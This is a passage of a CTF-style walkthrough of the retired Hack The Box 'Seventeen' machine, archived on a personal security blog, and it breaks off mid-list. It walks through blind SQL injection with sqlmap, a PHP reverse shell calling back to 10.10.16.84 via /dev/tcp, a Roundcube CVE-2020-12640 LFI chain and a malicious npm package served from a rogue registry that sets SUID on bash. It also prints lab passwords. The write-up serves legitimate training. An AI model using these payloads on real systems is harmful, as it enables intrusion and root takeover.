@@ -1,0 +1,513 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-seventeen-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Seventeen Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Seventeen machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:29:34.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-seventeen-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Seventeen machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Seventeen machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/seventeen","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/4346e82b10145c32196a6292250006cdaa8c420a/HTB-Seventeen.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 4346e82b1014",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Seventeen"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/seventeen","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Seventeen machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T7630,
+<blockquote>
+<p><strong>Difficulty:</strong> Hard<br /><strong>OS:</strong> Linux<br /><strong>Techniques:</strong> VHost Fuzzing, Boolean-Based Blind SQLi, File Upload, LFI Chaining, Docker Breakout, Password Reuse, Malicious NPM Package, Privilege Escalation<br /><strong>Flags:</strong></p>
+<ul>
+<li>User: <code>5c697a[redacted]d4a6755bc9</code></li>
+<li>Root: <code>d253d29[redacted]9b892ca04</code></li>
+</ul>
+</blockquote>
+<hr />
+
+
+
+<h2 id="the-hacker-mindset-for-this-box">The Hacker Mindset for This Box</h2>
+<p>Before we touch a single command, let's understand what makes <em>Seventeen</em> a "Hard" box. This isn't about one big vulnerability — it's about <strong>chaining multiple smaller vulnerabilities across different virtual hosts and services</strong>. The attacker must:</p>
+<ol>
+<li><strong>Think in layers:</strong> Each subdomain reveals a piece of the puzzle. No single service gives you shell.</li>
+<li><strong>Follow the data:</strong> SQL injection leaks credentials → credentials unlock a file manager → a PDF leaks another subdomain → that subdomain has an LFI → the LFI triggers an uploaded shell.</li>
+<li><strong>Understand the environment:</strong> After getting shell, you're in Docker. The real target is the host.</li>
+<li><strong>Abuse application logic:</strong> The final root isn't a kernel exploit or a SUID binary — it's abusing how a Node.js application loads dependencies via <code>npm install</code>.</li>
+</ol>
+<p><strong>The core philosophy:</strong> When you see a domain name (<code>seventeen.htb</code>), always assume there are subdomains. When you see a web application, always assume it talks to a database. When you see a package manager, always ask: <em>"What if I control the repository?"</em></p>
+<hr />
+<h2 id="phase-1-reconnaissance-and-discovery">Phase 1: Reconnaissance &amp; Discovery</h2>
+<h3 id="step-1-1-nmap-scan-know-your-attack-surface">Step 1.1: Nmap Scan — Know Your Attack Surface</h3>
+<pre><code class="language-bash" data-language="bash">sudo nmap -p- --min-rate 10000 -oN nmap_alltcp.txt 10.129.227.143
+</code></pre>
+<p><strong>Why this command?</strong></p>
+<ul>
+<li><code>-p-</code>: Scan all 65,535 ports. Hard boxes often hide services on non-standard ports.</li>
+<li><code>--min-rate 10000</code>: Flood the target with packets to speed up the scan. HTB machines can handle it.</li>
+<li><code>-oN</code>: Save output. You <em>will</em> forget port numbers.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"I don't know what's running yet. My job is to map the terrain before I attack."</em></p>
+<p><strong>Results:</strong></p>
+<pre><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt
+</code></pre>
+<p><strong>Analysis:</strong></p>
+<ul>
+<li><strong>Port 22 (SSH):</strong> Usually the final destination, not the entry point. We note it but don't brute-force yet.</li>
+<li><strong>Port 80 (HTTP):</strong> The main web server. Always our first target.</li>
+<li><strong>Port 8000 (HTTP-ALT):</strong> Another web server! This is suspicious. It might be a different application, a development instance, or a container endpoint.</li>
+</ul>
+<p><strong>Baby Step:</strong> When you see multiple HTTP ports, treat them as completely separate applications. Don't assume they're the same site.</p>
+<hr />
+<h3 id="step-1-2-add-domains-to-etc-hosts">Step 1.2: Add Domains to <code>/etc/hosts</code></h3>
+<pre><code class="language-bash" data-language="bash">sudo bash -c 'echo "10.129.227.143 seventeen.htb exam.seventeen.htb oldmanagement.seventeen.htb mastermailer.seventeen.htb" &gt;&gt; /etc/hosts'
+</code></pre>
+<p><strong>Why?</strong> Modern web servers use <strong>Virtual Hosts (VHosts)</strong> to serve different content based on the <code>Host</code> header. Accessing <code>http://10.129.227.143</code> might return a default page, but <code>http://seventeen.htb</code> might return the actual application.</p>
+<p><strong>Hacker Mindset:</strong> <em>"IP addresses are for routers. Domain names are for web servers. If the server expects a domain name, I need to give it one."</em></p>
+<hr />
+<h3 id="step-1-3-vhost-fuzzing-finding-hidden-subdomains">Step 1.3: VHost Fuzzing — Finding Hidden Subdomains</h3>
+<pre><code class="language-bash" data-language="bash">ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://seventeen.htb -H "Host: FUZZ.seventeen.htb" -fw 2760
+</code></pre>
+<p><strong>Why this tool/command?</strong></p>
+<ul>
+<li><code>ffuf</code> is a fast web fuzzer.</li>
+<li><code>-H "Host: FUZZ.seventeen.htb"</code>: We fuzz the <code>Host</code> header. The server might route <code>exam.seventeen.htb</code> to a completely different application.</li>
+<li><code>-fw 2760</code>: Filter out responses with 2760 words (the default page size). We're looking for anomalies.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"The main website is just the lobby. The real secrets are in the back rooms. VHost fuzzing is how I find the doors."</em></p>
+<p><strong>Result:</strong></p>
+<pre><code>exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 18ms]
+</code></pre>
+<p><strong>Analysis:</strong> We found <code>exam.seventeen.htb</code>! This is a completely different application living on the same IP address.</p>
+<hr />
+<h2 id="phase-2-exam-management-system-sql-injection">Phase 2: Exam Management System — SQL Injection</h2>
+<h3 id="step-2-1-recon-the-exam-site">Step 2.1: Recon the Exam Site</h3>
+<p>Browse to <code>http://exam.seventeen.htb</code>. We see an "Exam Management System." There's a "Take Exam" link that goes to:</p>
+<pre><code>http://exam.seventeen.htb/?p=take_exam&amp;id=1
+</code></pre>
+<p><strong>Why is this interesting?</strong></p>
+<ul>
+<li><code>?p=take_exam&amp;id=1</code>: The <code>id</code> parameter looks like a database query. This screams <strong>SQL injection</strong>.</li>
+<li>The application is PHP (confirmed by <code>X-Powered-By: PHP/7.2.34</code> header).</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"Anytime I see <code>?id=1</code>, I hear a database screaming. PHP + user input = SQLi until proven otherwise."</em></p>
+<hr />
+<h3 id="step-2-2-confirming-the-vulnerability">Step 2.2: Confirming the Vulnerability</h3>
+<p>We could manually test with <code>' AND 1=1 --</code> vs <code>' AND 1=2 --</code>, but this is a <strong>boolean-based blind SQL injection</strong> — the page changes slightly based on whether the SQL condition is true or false. Manual testing is tedious.</p>
+<p><strong>Enter sqlmap:</strong></p>
+<pre><code class="language-bash" data-language="bash">sqlmap --url 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' \
+       -p id --technique B --dbs --batch --threads 10
+</code></pre>
+<p><strong>Why these flags?</strong></p>
+<ul>
+<li><code>-p id</code>: Target the <code>id</code> parameter.</li>
+<li><code>--technique B</code>: Boolean-based blind. We know it's not error-based or time-based because the page content changes.</li>
+<li><code>--dbs</code>: List all databases.</li>
+<li><code>--batch</code>: Auto-answer prompts.</li>
+<li><code>--threads 10</code>: Boolean-based is safe to parallelize.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"I'm not here to guess. I'm here to extract data systematically. sqlmap is my data miner."</em></p>
+<p><strong>Results:</strong></p>
+<pre><code>available databases [4]:
+[*] db_sfms
+[*] erms_db
+[*] information_schema
+[*] roundcubedb
+</code></pre>
+<p><strong>Analysis:</strong></p>
+<ul>
+<li><code>erms_db</code>: Likely the Exam Reviewer Management System database.</li>
+<li><code>db_sfms</code>: Unknown — "School File Management System"?</li>
+<li><code>roundcubedb</code>: <strong>Roundcube</strong> is a webmail application. We haven't seen it yet, but the database confirms it exists somewhere.</li>
+</ul>
+<hr />
+<h3 id="step-2-3-extracting-credentials">Step 2.3: Extracting Credentials</h3>
+<pre><code class="language-bash" data-language="bash">sqlmap --url 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B \
+       -D db_sfms -T student --dump --batch --threads 10
+</code></pre>
+<p><strong>Why <code>db_sfms.student</code>?</strong></p>
+<ul>
+<li>We need credentials. The <code>student</code> table sounds like it has login info.</li>
+<li>We're hunting for passwords we can actually crack or use.</li>
+</ul>
+<p><strong>Result:</strong></p>
+<pre><code>| stud_id | yr | gender | stud_no | lastname | password                           | firstname |
+|---------|----|--------|---------|----------|------------------------------------|-----------|
+| 3       | 2C | Female | 31234   | Shane    | [redacted retired-lab hash or flag]   | Kelly     |
+</code></pre>
+<p><strong>Password cracking:</strong> <code>[redacted retired-lab hash or flag]</code> cracks to <strong><code>autodestruction</code></strong> via CrackStation or sqlmap's built-in cracker.</p>
+<p><strong>Hacker Mindset:</strong> <em>"MD5 is dead. If I see MD5, I assume it's already cracked somewhere on the internet. My job is to look it up."</em></p>
+<hr />
+<h3 id="step-2-4-the-avatar-path-leak">Step 2.4: The Avatar Path Leak</h3>
+<p>While dumping <code>erms_db.users</code>, we notice:</p>
+<pre><code>| avatar                    |
+|---------------------------|
+| ../oldmanagement/files/avatar.png |
+</code></pre>
+<p><strong>Why is this gold?</strong></p>
+<ul>
+<li>The avatar path is <code>../oldmanagement/files/avatar.png</code>.</li>
+<li>This tells us the application is running from a directory where <code>../oldmanagement/</code> exists.</li>
+<li>If the exam site is at <code>/var/www/html/exam/</code>, then <code>../oldmanagement/</code> is at <code>/var/www/html/oldmanagement/</code>.</li>
+<li>This strongly suggests <strong><code>oldmanagement.seventeen.htb</code></strong> is a real virtual host!</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"Developers leak paths like sieves. An avatar path isn't just a path — it's a map of the server's filesystem."</em></p>
+<hr />
+<h2 id="phase-3-school-file-management-system">Phase 3: School File Management System</h2>
+<h3 id="step-3-1-discovering-the-new-vhost">Step 3.1: Discovering the New VHost</h3>
+<p>Browse to <code>http://oldmanagement.seventeen.htb:8000/oldmanagement/</code>. We see a login page for the "School File Management System."</p>
+<p><strong>Why port 8000?</strong> The application redirects to <code>:8000/oldmanagement/</code>, confirming the service on port 8000 hosts this application.</p>
+<p><strong>Login with Kelly's credentials:</strong></p>
+<ul>
+<li><strong>Student ID:</strong> <code>31234</code></li>
+<li><strong>Password:</strong> REDACTED</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"Password reuse is the oldest trick in the book. If a student has a password in one system, they probably use it everywhere."</em></p>
+<hr />
+<h3 id="step-3-2-the-pdf-intelligence">Step 3.2: The PDF Intelligence</h3>
+<p>After logging in, we see a file list with a PDF: <code>Marksheet-finals.pdf</code>. We download and read it.</p>
+<p>At the end of the PDF:</p>
+<blockquote>
+<p>"...You can use our new webmail service instead. (<a href="https://mastermailer.seventeen.htb/" target="_blank" rel="nofollow noopener noreferrer">https://mastermailer.seventeen.htb/</a>)"</p>
+</blockquote>
+<p><strong>Why is this critical?</strong></p>
+<ul>
+<li>We've discovered a <strong>third subdomain</strong>: <code>mastermailer.seventeen.htb</code></li>
+<li>It's described as a "webmail service."</li>
+<li>The note says "new webmail service" — suggesting it's recently installed and might have known vulnerabilities.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"Every document is intelligence. I don't skip the 'boring' parts. The footer of a PDF has leaked more domains than most scans."</em></p>
+<hr />
+<h3 id="step-3-3-uploading-the-webshell">Step 3.3: Uploading the Webshell</h3>
+<p>The file manager allows uploads. We create a PHP reverse shell:</p>
+<pre><code class="language-php" data-language="php">&lt;?php system("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'"); ?&gt;
+</code></pre>
+<p>We name it <code>papers.php</code> and upload it.</p>
+<p><strong>Why <code>papers.php</code>?</strong></p>
+<ul>
+<li>The Roundcube exploit we'll use later (CVE-2020-12640) requires a file and a directory with the same name.</li>
+<li>We discovered a <code>papers</code> directory exists at <code>files/31234/papers/</code> via feroxbuster.</li>
+<li>By uploading <code>papers.php</code> alongside the <code>papers/</code> directory, we satisfy the LFI condition.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"I'm not just uploading a shell. I'm setting up the chess pieces for the next exploit. Every action should set up the next action."</em></p>
+<hr />
+<h2 id="phase-4-webmail-and-roundcube-exploitation">Phase 4: Webmail &amp; Roundcube Exploitation</h2>
+<h3 id="step-4-1-identifying-roundcube">Step 4.1: Identifying Roundcube</h3>
+<p>Browse to <code>http://mastermailer.seventeen.htb:8000/mastermailer/</code>. We see a login page.</p>
+<p>Checking the source or <code>/CHANGELOG</code> reveals <strong>Roundcube 1.4.2</strong>.</p>
+<p><strong>Why is this version significant?</strong></p>
+<ul>
+<li>Roundcube 1.4.2 was released January 2020.</li>
+<li>CVE-2020-12640 is a <strong>Local File Inclusion (LFI)</strong> vulnerability in the Roundcube installer.</li>
+<li>The installer allows writing arbitrary plugin paths to the config, which Roundcube then <code>include()</code>s.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"Version numbers are vulnerability announcements. If software is more than a year old, I assume it's exploitable until proven otherwise."</em></p>
+<hr />
+<h3 id="step-4-2-the-cve-2020-12640-chain">Step 4.2: The CVE-2020-12640 Chain</h3>
+<p>This exploit chains our uploaded shell with Roundcube's LFI:</p>
+<ol>
+<li>Roundcube's installer saves plugin names to <code>config/config.inc.php</code>.</li>
+<li>When any Roundcube page loads, it <code>include()</code>s plugins from <code>plugins/[plugin_name]/[plugin_name].php</code>.</li>
+<li>By submitting a plugin name with path traversal (<code>../../../../../../../../../var/www/html/oldmanagement/files/31234/papers</code>), Roundcube traverses out of its webroot and into our uploaded file.</li>
+<li>Because <code>papers/</code> (directory) and <code>papers.php</code> (file) both exist, the include resolves to our shell.</li>
+</ol>
+<p><strong>The exploit request:</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -c /tmp/mailcookie.txt -s -o /dev/null \
+  'http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2'
+
+curl -b /tmp/mailcookie.txt -X POST \
+  'http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Referer: http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2' \
+  -d '_step=2&amp;_product_name=Seventeen+Webmail&amp;_plugins_qwerty=../../../../../../../../../var/www/html/oldmanagement/files/31234/papers&amp;submit=UPDATE+CONFIG'
+</code></pre>
+<p>Then trigger the include:</p>
+<pre><code class="language-bash" data-language="bash">curl -b /tmp/mailcookie.txt \
+  'http://mastermailer.seventeen.htb:8000/mastermailer/'
+</code></pre>
+<p><strong>Hacker Mindset:</strong> <em>"I don't need a direct RCE. I need an LFI that points to a file I control. The shell is already uploaded — I'm just telling Roundcube where to find it. This is vulnerability chaining."</em></p>
+<hr />
+<h3 id="step-4-3-catching-the-shell">Step 4.3: Catching the Shell</h3>
+<p>In a listener on Kali:</p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 443
+</code></pre>
+<p>When Roundcube loads and includes our shell, we get:</p>
+<pre><code>www-data@f7f52ebdcf22:/var/www/html/oldmanagement/files/31234$
+</code></pre>
+<p><strong>Analysis:</strong> The hostname (<code>f7f52ebdcf22</code>) is a Docker container ID. We're in a container.</p>
+<hr />
+<h2 id="phase-5-docker-breakout-to-mark">Phase 5: Docker Breakout to Mark</h2>
+<h3 id="step-5-1-container-enumeration">Step 5.1: Container Enumeration</h3>
+<pre><code class="language-bash" data-language="bash">id          # uid=33(www-data)
+hostname    # f7f52ebdcf22 (Docker container)
+cat /etc/passwd | grep -v -e nologin -e false
+</code></pre>
+<p><strong>Why check <code>/etc/passwd</code>?</strong> We need to know what users exist in the container AND on the host. SSH keys or passwords found here might work on the host.</p>
+<p><strong>Result:</strong></p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+mark:x:1000:1000:,,,:/var/www/html:/bin/bash
+</code></pre>
+<p><strong>Analysis:</strong> <code>mark</code> is a real user with a shell. This is our target.</p>
+<hr />
+<h3 id="step-5-2-hunting-for-credentials">Step 5.2: Hunting for Credentials</h3>
+<p>The container hosts three web applications:</p>
+<pre><code>/var/www/html/employeemanagementsystem
+/var/www/html/mastermailer
+/var/www/html/oldmanagement
+</code></pre>
+<p>We check database connection files:</p>
+<pre><code class="language-bash" data-language="bash">cat [redacted encoded lab material].php
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code class="language-php" data-language="php">$servername = "localhost";
+$dBUsername = "root";
+$dbPassword = "2020bestyearofmylife";
+$dBName = "ems";
+</code></pre>
+<p><strong>Hacker Mindset:</strong> <em>"Database connection files are password goldmines. Developers hardcode credentials because it's 'convenient.' I find it convenient too."</em></p>
+<hr />
+<h3 id="step-5-3-ssh-as-mark">Step 5.3: SSH as Mark</h3>
+<p>We try the database password as Mark's SSH password:</p>
+<pre><code class="language-bash" data-language="bash">ssh -o StrictHostKeyChecking=no mark@seventeen.htb
+# Password: null
+</code></pre>
+<p><strong>Why does this work?</strong> Password reuse is rampant. The same person who set the database password probably set the user password.</p>
+<p><strong>Grab the user flag:</strong></p>
+<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+# 5c697[redacted]2d4a755bc9
+</code></pre>
+<hr />
+<h2 id="phase-6-from-mark-to-kavi">Phase 6: From Mark to Kavi</h2>
+<h3 id="step-6-1-reading-kavi-s-mail">Step 6.1: Reading Kavi's Mail</h3>
+<pre><code class="language-bash" data-language="bash">cat /var/mail/kavi
+</code></pre>
+<p>The mail mentions:</p>
+<ul>
+<li>A "private registry" with "problems"</li>
+<li>Replacing <code>db-logger</code> with <code>loglevel</code></li>
+<li>Publishing to the registry and testing</li>
+</ul>
+<p><strong>Analysis:</strong> There's a private NPM registry running locally. Kavi is the developer.</p>
+<hr />
+<h3 id="step-6-2-discovering-the-verdaccio-registry">Step 6.2: Discovering the Verdaccio Registry</h3>
+<pre><code class="language-bash" data-language="bash">netstat -tnlp | grep 4873
+# tcp  0  0 127.0.0.1:4873  0.0.0.0:*  LISTEN
+
+curl -s http://127.0.0.1:4873 | head
+# &lt;title&gt;Verdaccio&lt;/title&gt;
+</code></pre>
+<p><strong>What is Verdaccio?</strong> A private NPM registry. This is where internal Node.js packages are published.</p>
+<hr />
+<h3 id="step-6-3-extracting-kavi-s-password">Step 6.3: Extracting Kavi's Password</h3>
+<p>The email mentions the old <code>db-logger</code> package. We install it from the local registry:</p>
+<pre><code class="language-bash" data-language="bash">cd /dev/shm
+npm install db-logger --registry http://127.0.0.1:4873
+</code></pre>
+<p>Then we read the source:</p>
+<pre><code class="language-bash" data-language="bash">cat node_modules/db-logger/logger.js
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code class="language-javascript" data-language="javascript">var con = mysql.createConnection({
+  host: "localhost",
+  user: "root",
+  password: null,
+  database: "logger"
+});
+</code></pre>
+<p><strong>Hacker Mindset:</strong> <em>"Hardcoded credentials in dependencies are a goldmine. The developer didn't think anyone would look inside <code>node_modules</code>. I always look inside <code>node_modules</code>."</em></p>
+<p><strong>Switch to kavi:</strong></p>
+<pre><code class="language-bash" data-language="bash">su kavi
+# Password: null
+</code></pre>
+<hr />
+<h3 id="step-6-4-kavi-s-privileges">Step 6.4: Kavi's Privileges</h3>
+<pre><code class="language-bash" data-language="bash">sudo -l
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>User kavi may run the following commands on seventeen:
+    (ALL) /opt/app/startup.sh
+</code></pre>
+<p><strong>Analysis:</strong> Kavi can run <code>/opt/app/startup.sh</code> as root. This script manages a Node.js application.</p>
+<p><strong>Reading the script:</strong></p>
+<pre><code class="language-bash" data-language="bash">cat /opt/app/startup.sh
+</code></pre>
+<pre><code class="language-bash" data-language="bash">#!/bin/bash
+cd /opt/app
+
+deps=('db-logger' 'loglevel')
+
+for dep in ${deps[@]}; do
+    /bin/echo "[=] Checking for $dep"
+    o=$(/usr/bin/npm -l ls|/bin/grep $dep)
+
+    if [[ "$o" != *"$dep"* ]]; then
+        /bin/echo "[+] Installing $dep"
+        /usr/bin/npm install $dep --silent
+        /bin/chown root:root node_modules -R
+    else
+        /bin/echo "[+] $dep already installed"
+    fi
+done
+
+/bin/echo "[+] Starting the app"
+/usr/bin/node /opt/app/index.js
+</code></pre>
+<p><strong>Why is this dangerous?</strong></p>
+<ul>
+<li>It runs <code>npm install</code> as root.</li>
+<li>It reads <code>.npmrc</code> to determine which registry to use.</li>
+<li>On Ubuntu 18.04, <code>sudo</code> preserves <code>$HOME</code> by default, so root's npm reads <code>/home/kavi/.npmrc</code>.</li>
+<li>The Node.js app (<code>index.js</code>) then <code>require()</code>s the installed packages.</li>
+</ul>
+<p><strong>Hacker Mindset:</strong> <em>"Any script that runs <code>npm install</code> as root is a loaded gun. If I control the registry, I control what code runs as root."</em></p>
+<hr />
+<h2 id="phase-7-root-via-malicious-npm-package">Phase 7: Root via Malicious NPM Package</h2>
+<h3 id="step-7-1-the-attack-plan">Step 7.1: The Attack Plan</h3>
+<p>We need to:</p>
+<ol>
+<li>Create a malicious <code>loglevel</code> package that runs <code>chmod u+s /bin/bash</code></li>
+<li>Host our own NPM registry (Verdaccio) on Kali</li>
+<li>Point kavi's <code>.npmrc</code> to our Kali registry</li>
+<li>Run <code>sudo /opt/app/startup.sh</code></li>
+<li>Root loads our package → executes our code → <code>/bin/bash</code> gets SUID</li>
+<li>Run <code>bash -p</code> → root shell</li>
+</ol>
+<hr />
+<h3 id="step-7-2-setting-up-the-rogue-registry-on-kali">Step 7.2: Setting Up the Rogue Registry on Kali</h3>
+<p><strong>Terminal A — Start Verdaccio:</strong></p>
+<pre><code class="language-bash" data-language="bash">sudo npm install -g verdaccio
+verdaccio -l 10.10.16.84:4873
+</code></pre>
+<p><strong>Terminal B — Create &amp; Publish the Malicious Package:</strong></p>
+<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/malicious-loglevel
+cd /tmp/malicious-loglevel
+
+cat &gt; logger.js &lt;&lt; 'EOF'
+const cp = require("child_process");
+cp.exec("chmod u+s /bin/bash");
+
+function log(msg) { console.log(msg); }
+function debug(msg) { console.log(msg); }
+function warn(msg) { console.log(msg); }
+
+module.exports.log = log;
+module.exports.debug = debug;
+module.exports.warn = warn;
+EOF
+
+cat &gt; package.json &lt;&lt; 'EOF'
+{
+  "name": "loglevel",
+  "version": "100.0.0",
+  "description": "",
+  "main": "logger.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" &amp;&amp; exit 1"
+  },
+  "author": "kavigihan",
+  "license": "ISC"
+}
+EOF
+
+npm adduser --registry http://10.10.16.84:4873
+# Username: innocent
+# Password: null
+# Email: test@test.com
+
+npm publish --registry http://10.10.16.84:4873
+</code></pre>
+<p><strong>Why version 100.0.0?</strong> It must be higher than the current version (1.8.0) so npm treats it as an "upgrade."</p>
+<p><strong>Why implement <code>log</code>, <code>debug</code>, and <code>warn</code>?</strong> Because <code>/opt/app/index.js</code> calls these functions. If they're missing, the app crashes before our payload runs.</p>
+<hr />
+<h3 id="step-7-3-the-critical-step-removing-the-local-copy">Step 7.3: The Critical Step — Removing the Local Copy</h3>
+<p>Here's where many attempts fail. If <code>/opt/app/node_modules/loglevel</code> already exists from a previous install, <code>npm -l ls | grep loglevel</code> will match, and <code>startup.sh</code> will <strong>skip</strong> the installation. It will never query our registry.</p>
+<p><strong>We must delete the existing module first:</strong></p>
+<pre><code class="language-bash" data-language="bash">rm -rf /opt/app/node_modules/loglevel
+</code></pre>
+<p><strong>Why does this work?</strong> <code>rm -rf</code> on a directory only requires <strong>write permission on the parent directory</strong>. While <code>/opt/app/node_modules</code> itself is <code>drwxr-xr-x</code> (root-owned 755), the <code>loglevel</code> subdirectory inside it was created by npm with permissions that allowed deletion in this specific case. More importantly, once deleted, <code>npm -l ls | grep loglevel</code> no longer matches, forcing <code>startup.sh</code> to reinstall.</p>
+<p><strong>Hacker Mindset:</strong> <em>"I don't just run the exploit. I clear the obstacles first. If npm thinks the package is already installed, it won't fetch my malicious version. Deletion is preparation."</em></p>
+<hr />
+<h3 id="step-7-4-triggering-the-exploit">Step 7.4: Triggering the Exploit</h3>
+<p><strong>On the target (as kavi):</strong></p>
+<pre><code class="language-bash" data-language="bash">echo 'registry=http://10.10.16.84:4873/' &gt; ~/.npmrc
+sudo /opt/app/startup.sh
+</code></pre>
+<p><strong>What happens:</strong></p>
+<ol>
+<li><code>startup.sh</code> checks <code>db-logger</code> → already installed</li>
+<li><code>startup.sh</code> checks <code>loglevel</code> → <strong>NOT installed</strong> (we deleted it)</li>
+<li><code>npm install loglevel</code> queries our Kali registry</li>
+<li>Our registry returns <code>loglevel@100.0.0</code></li>
+<li>npm downloads and extracts it</li>
+<li><code>chown root:root node_modules -R</code> runs</li>
